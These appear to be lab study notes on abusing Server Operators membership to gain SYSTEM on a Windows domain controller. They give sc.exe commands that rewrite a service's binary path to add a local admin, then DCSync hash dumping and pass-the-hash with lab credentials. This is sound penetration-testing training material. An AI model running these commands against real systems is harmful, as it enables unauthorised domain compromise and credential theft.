# Section 15 — Server Operators

> **Lab: yes** — RDP to DC as Server Operators member. Abuse SERVICE_ALL_ACCESS on a SYSTEM service to add yourself to local admins, then read the flag.

**Core principle:** Server Operators have `SERVICE_ALL_ACCESS` on many services running as `LocalSystem`. This means they can reconfigure a service's binary path to run an arbitrary command, then start the service — the command executes as SYSTEM. This is one of the simplest and most reliable group-based privesc paths on a Domain Controller.

---

## Why this works

```
1. Server Operators → SERVICE_ALL_ACCESS on local services
2. SERVICE_ALL_ACCESS → can change the binPath of any controlled service
3. Change binPath to: cmd /c net localgroup Administrators <user> /add
4. Start the service → command executes as NT AUTHORITY\SYSTEM
5. Service fails to start (not a real binary) — but the command already ran
6. User is now local admin on the DC → full domain compromise
```

---

## What Server Operators grants

| Privilege / Right | Impact |
|-------------------|--------|
| SeBackupPrivilege | Read any file (bypass ACLs) |
| SeRestorePrivilege | Write any file (bypass ACLs) |
| SERVICE_ALL_ACCESS on local services | Reconfigure and start/stop services |
| Log on locally to DCs | RDP / console access |
| Shut down the system | Can reboot the DC |

---

## Step-by-step attack

### Step 1: Find a service running as LocalSystem

```cmd
sc.exe qc AppReadiness
```
> Queries the config of the AppReadiness service. Look for `SERVICE_START_NAME : LocalSystem` — this means it runs as SYSTEM. AppReadiness is a good target because it's a demand-start service that won't break critical DC functionality.

### Step 2: Confirm Server Operators has full control

```cmd
C:\Tools\PsService.exe security AppReadiness
```
> Shows the security descriptor for the service. Look for `[ALLOW] BUILTIN\Server Operators` with `All` permissions. This confirms you can reconfigure and start/stop the service.

**Alternative without PsService:**
```cmd
sc.exe sdshow AppReadiness
```
> Outputs raw SDDL. Look for `SO` (Server Operators) with full permissions.

### Step 3: Verify you're not already a local admin

```cmd
net localgroup Administrators
```
> Confirm your user isn't listed. After the attack, they will be.

### Step 4: Reconfigure the service binary path

```cmd
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators <YOUR_USER> /add"
```
> Replaces the service's executable path with a command that adds your user to local Administrators. **Note the space after `binPath=`** — this is required by `sc.exe` syntax. The original binary path is overwritten.

### Step 5: Start the service

```cmd
sc.exe start AppReadiness
```
> The service attempts to start, executes the `cmd /c net localgroup...` command as SYSTEM, then fails with error 1053 (timeout). **The failure is expected** — `cmd /c` is not a valid service binary. But the command already executed successfully before the timeout.

### Step 6: Confirm local admin membership

```cmd
net localgroup Administrators
```
> Your user should now be listed. You have full local admin on the Domain Controller.

### Step 7: Access the flag

You need a **new logon session** for the admin group membership to take effect in your token.

**Option A — Log out and RDP back in:**
```
Log off → RDP back in → type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

**Option B — From attacker box with nxc + secretsdump:**
```bash
nxc smb <TARGET_IP> -u <YOUR_USER> -p '<PASSWORD>'
```
> Should show `(Pwn3d!)` confirming local admin access.

```bash
secretsdump.py <YOUR_USER>@<TARGET_IP> -just-dc-user administrator
```
> Dumps the Administrator NTLM hash via DCSync. Use pass-the-hash to access the flag.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-DC01)
**Creds:** `server_adm` / `HTB_@cademy_stdnt!`
**Goal:** Escalate → read `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`
**Access:** RDP

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = server_adm                               │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
│ SERVICE      = AppReadiness                             │
│ FLAG_PATH    = c:\Users\Administrator\Desktop\          │
│                ServerOperators\flag.txt                  │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:server_adm /p:'HTB_@cademy_stdnt!'

TARGET BOX (as server_adm — ELEVATED prompt)
─────────────────────────────────────────────
2. Get elevated prompt
   Right-click PowerShell ISE → Run as administrator
   (or: Start-Process cmd.exe -Verb RunAs)

3. Confirm service runs as SYSTEM
   sc.exe qc AppReadiness

4. Reconfigure the service
   sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

5. Start the service (will fail — that's fine)
   sc.exe start AppReadiness

6. Confirm admin membership
   net localgroup Administrators
   (server_adm should be listed)

7. Log off and RDP back in for new token

8. Read the flag
   type c:\Users\Administrator\Desktop\ServerOperators\flag.txt

ALTERNATIVE: READ FLAG FROM ATTACKER BOX
────────────────────────────────────────
7a. Confirm admin access
    nxc smb <TARGET_IP> -u server_adm -p 'HTB_@cademy_stdnt!'
    (Should show Pwn3d!)

7b. Dump administrator hash
    secretsdump.py server_adm:'HTB_@cademy_stdnt!'@<TARGET_IP> -just-dc-user administrator

7c. Pass-the-hash to read flag
    psexec.py administrator@<TARGET_IP> -hashes :<NTLM_HASH>
    type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

---

## Lab observations & attack chain

```
Server Operators membership (server_adm)
│
├── SERVICE_ALL_ACCESS on AppReadiness (runs as LocalSystem)
│   ├── sc.exe config → change binPath to "cmd /c net localgroup Administrators server_adm /add"
│   └── sc.exe start → command executes as SYSTEM → fails with 1053 (expected)
│       └── server_adm added to local Administrators
│
├── Post-escalation (local admin on DC)
│   ├── Read flag (after re-login for token refresh)
│   ├── secretsdump.py → DCSync all domain hashes
│   ├── psexec.py / wmiexec.py with admin hash → SYSTEM shell
│   └── Full domain compromise
│
└── Cleanup
    ├── net localgroup Administrators server_adm /delete
    └── sc.exe config AppReadiness binPath= "<ORIGINAL_BINPATH>"
        (Restore: C:\Windows\System32\svchost.exe -k AppReadiness -p)
```

---

## Key takeaways

- **Server Operators = service control = SYSTEM command execution.** Simplest group-based privesc — no exploits, no drivers, just service reconfiguration.
- **AppReadiness is the go-to target service.** Runs as LocalSystem, demand-start, non-critical. Other SYSTEM services work too.
- **The service start "failure" is expected.** Error 1053 means the service timed out — but the `cmd /c` payload already executed.
- **Space after `binPath=` is mandatory.** `sc.exe config` syntax quirk — without the space, the command fails silently.
- **New logon session required after group add.** Log out and back in, or access from attacker box via nxc/secretsdump.
- **Use `sc.exe` not `sc` in PowerShell.** `sc` aliases to `Set-Content` in PowerShell.
- **Always restore the original binPath** on real engagements. Leaving a service misconfigured breaks functionality and leaves evidence.
